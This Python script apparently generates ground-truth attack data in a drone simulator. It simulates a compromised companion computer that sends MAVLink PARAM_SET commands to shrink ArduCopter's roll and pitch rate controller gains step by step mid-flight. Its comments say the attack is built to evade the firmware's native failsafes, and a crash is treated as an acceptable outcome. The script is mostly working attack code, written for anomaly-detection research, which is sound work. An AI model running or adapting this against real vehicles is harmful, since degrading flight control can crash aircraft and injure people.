#!/usr/bin/env python3
"""
Control-Aware Attack: Gradual PID Gain Drift
Simulates a compromised Companion Computer injecting incremental,
mathematically valid but physically malicious PARAM_SET commands
into the roll/pitch rate controllers mid-flight.

Represents the attacker with direct MAVLink bus access (same trust
level as a legitimate companion computer) -- this does NOT go through
the semantic firewall, since that's Phase 3.
"""

import time
import random
import argparse
import csv
import os
import sys
from pymavlink import mavutil

CONNECTION_STRING = 'udp:127.0.0.1:14551'
ATTACK_LOG_DIR = '/mnt/hgfs/Dataset/AttackGroundTruth'

HOME_LAT = -35.363262
HOME_LON = 149.165237

# Roll & pitch rate controller P gains. Detuning these degrades
# attitude control without touching anything ArduPilot's native
# failsafes actually watch (battery, GPS, radio, EKF health) --
# that's the whole point of a control-aware attack.
TARGET_PARAMS = ['ATC_RAT_RLL_P', 'ATC_RAT_PIT_P']
DEFAULT_GAIN = 0.135  # ArduCopter stock default, used as fallback only

def flush_mavlink_buffer(mav):
    """Drain any stale MAVLink packets queued in the UDP OS buffer."""
    while mav.recv_match(blocking=False) is not None:
        pass

def wait_ack(mav, command_name):
    ack = mav.recv_match(type='COMMAND_ACK', blocking=True, timeout=5)
    if ack is None:
        print(f'No ACK for {command_name}')
        return False
    result_name = mavutil.mavlink.enums["MAV_RESULT"][ack.result].name
    print(f'{command_name}: {result_name}')
    return ack.result == mavutil.mavlink.MAV_RESULT_ACCEPTED


def set_mode(mav, mode_name):
    mode_id = mav.mode_mapping()[mode_name]
    mav.mav.set_mode_send(
        mav.target_system,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        mode_id)
    time.sleep(1)


def arm(mav):
    mav.mav.command_long_send(
        mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0, 1, 0, 0, 0, 0, 0, 0)
    return wait_ack(mav, 'ARM')


def takeoff(mav, alt):
    mav.mav.command_long_send(
        mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
        0, 0, 0, 0, 0, 0, 0, alt)
    return wait_ack(mav, 'TAKEOFF')

def goto(mav, lat, lon, alt):
    mav.mav.set_position_target_global_int_send(
        0, mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
        0b0000111111111000,
        int(lat * 1e7), int(lon * 1e7), alt,
        0, 0, 0, 0, 0, 0, 0, 0)

def wait_until_altitude(mav, target_alt, tolerance=0.5, timeout=60):
    flush_mavlink_buffer(mav)
    start = time.time()
    while time.time() - start < timeout:
        msg = mav.recv_match(type='GLOBAL_POSITION_INT', blocking=True, timeout=5)
        if msg and abs(msg.relative_alt / 1000.0 - target_alt) < tolerance:
            return True
    return False


def get_param(mav, param_id, timeout=5):
    flush_mavlink_buffer(mav)
    mav.mav.param_request_read_send(
        mav.target_system, mav.target_component,
        param_id.encode('utf-8'), -1)
    start = time.time()
    while time.time() - start < timeout:
        msg = mav.recv_match(type='PARAM_VALUE', blocking=True, timeout=1)
        if msg and msg.param_id.strip('\x00') == param_id:
            return msg.param_value
    print(f'WARNING: could not read {param_id}, using default {DEFAULT_GAIN}')
    return DEFAULT_GAIN

def set_param(mav, param_id, value):
    mav.mav.param_set_send(
        mav.target_system, mav.target_component,
        param_id.encode('utf-8'), value,
        mavutil.mavlink.MAV_PARAM_TYPE_REAL32)

def reset_params_to_default(mav):
    """Force known-good starting gains before arming, so takeoff and
    drift always start from a consistent, realistic baseline."""
    for p in TARGET_PARAMS:
        set_param(mav, p, DEFAULT_GAIN)
    time.sleep(1)
    print(f'Reset {TARGET_PARAMS} to {DEFAULT_GAIN}')


def land(mav):
    flush_mavlink_buffer(mav)
    mav.mav.command_long_send(
        mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_CMD_NAV_LAND,
        0, 0, 0, 0, 0, 0, 0, 0)
    wait_ack(mav, 'LAND')


def wait_for_disarm(mav, timeout=90):
    flush_mavlink_buffer(mav)
    start = time.time()
    while time.time() - start < timeout:
        msg = mav.recv_match(type='HEARTBEAT', blocking=True, timeout=5)
        if msg and not (msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED):
            return True
    return False


def monitor_attitude(mav, duration):
    """Flush stale UDP packets, then watch live attitude during post-attack window."""
    flush_mavlink_buffer(mav)
    start = time.time()
    max_roll = max_pitch = 0.0
    while time.time() - start < duration:
        msg = mav.recv_match(type='ATTITUDE', blocking=True, timeout=2)
        if msg:
            max_roll = max(max_roll, abs(msg.roll))
            max_pitch = max(max_pitch, abs(msg.pitch))
    return max_roll, max_pitch

def generate_waypoints(seed, n_points=3):
    """Generate seed-randomized waypoints around home, matching mission.py."""
    rng = random.Random(seed)
    waypoints = []
    for _ in range(n_points):
        d_lat = rng.uniform(-0.0012, 0.0012)
        d_lon = rng.uniform(-0.0012, 0.0012)
        waypoints.append((HOME_LAT + d_lat, HOME_LON + d_lon))
    return waypoints


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--seed', type=int, default=0)
    parser.add_argument('--alt', type=float, default=None)
    parser.add_argument('--drift-steps', type=int, default=15)
    parser.add_argument('--drift-interval', type=float, default=4.0)
    parser.add_argument('--drift-fraction', type=float, default=0.03,
                         help='Fractional gain reduction per step (0.03 = 3%%)')
    args = parser.parse_args()

    rng = random.Random(args.seed)
    takeoff_alt = args.alt if args.alt is not None else rng.uniform(8, 15)

    os.makedirs(ATTACK_LOG_DIR, exist_ok=True)
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    gt_filename = f'{ATTACK_LOG_DIR}/attack_pid_drift_seed{args.seed}_{timestamp}.csv'

    mav = mavutil.mavlink_connection(CONNECTION_STRING)
    mav.wait_heartbeat()
    print(f'Connected: system {mav.target_system}')

    # 1. Reset PID gains BEFORE arming so takeoff is clean
    reset_params_to_default(mav)
    originals = {p: get_param(mav, p) for p in TARGET_PARAMS}
    print(f'Original gains: {originals}')

    set_mode(mav, 'GUIDED')
    if not arm(mav):
        print('ABORT: arm failed'); sys.exit(1)
    if not takeoff(mav, takeoff_alt):
        print('ABORT: takeoff failed'); sys.exit(1)
    if not wait_until_altitude(mav, takeoff_alt):
        print('ABORT: never reached altitude'); sys.exit(1)

    print(f'Reached {takeoff_alt:.1f}m -- holding briefly before attack begins')
    time.sleep(5)

    waypoints = generate_waypoints(args.seed, n_points=3)
    # Space the 3 waypoints evenly across the drift steps (e.g., Steps 0, 5, 10)
    wp_trigger_steps = {
        0: waypoints[0],
        args.drift_steps // 3: waypoints[1],
        (2 * args.drift_steps) // 3: waypoints[2],
    }

    try:
        with open(gt_filename, 'w', newline='') as gt_file:
            gt_writer = csv.writer(gt_file)
            gt_writer.writerow(['t_wall', 'event', 'param', 'old_value', 'new_value'])
            gt_writer.writerow([time.time(), 'attack_start', '', '', ''])
            gt_file.flush()

            current = dict(originals)

            for step in range(args.drift_steps):
                if step in wp_trigger_steps:
                    lat, lon = wp_trigger_steps[step]
                    print(f'Commanding transit to waypoint ({lat:.6f}, {lon:.6f}) at step {step+1}')
                    goto(mav, lat, lon, takeoff_alt)

                for p in TARGET_PARAMS:
                    old_val = current[p]
                    new_val = old_val * (1 - args.drift_fraction)
                    set_param(mav, p, new_val)
                    gt_writer.writerow([time.time(), 'param_set', p, old_val, new_val])
                    current[p] = new_val
                gt_file.flush()
                print(f'Step {step+1}/{args.drift_steps}: {current}')
                time.sleep(args.drift_interval)

            gt_writer.writerow([time.time(), 'attack_end', '', '', ''])
            gt_file.flush()

            # Command transit back to HOME at peak degradation so the 15s
            # monitoring window captures active pitch/roll banking under low gains
            print('Commanding return transit to HOME under peak degradation...')
            goto(mav, HOME_LAT, HOME_LON, takeoff_alt)

            print('Monitoring live post-attack attitude behaviour (15s)...')
            max_roll, max_pitch = monitor_attitude(mav, 15)
            gt_writer.writerow([time.time(), 'observed_max_roll_rad', '', '', max_roll])
            gt_writer.writerow([time.time(), 'observed_max_pitch_rad', '', '', max_pitch])
            print(f'Max roll: {max_roll:.3f} rad, max pitch: {max_pitch:.3f} rad')

        print('Attempting landing (vehicle may already be unstable)')
        land(mav)
        if wait_for_disarm(mav, timeout=60):
            print('Confirmed landed/disarmed.')
        else:
            print('WARNING: landing/disarm not confirmed -- vehicle may have crashed. '
                  'This may itself be a valid experimental outcome, not a script bug.')

    finally:
        # Always restore stock gains at the end of the script
        reset_params_to_default(mav)

    print('Attack run complete.')
    print(f'Ground truth saved to {gt_filename}')


if __name__ == '__main__':
    main()
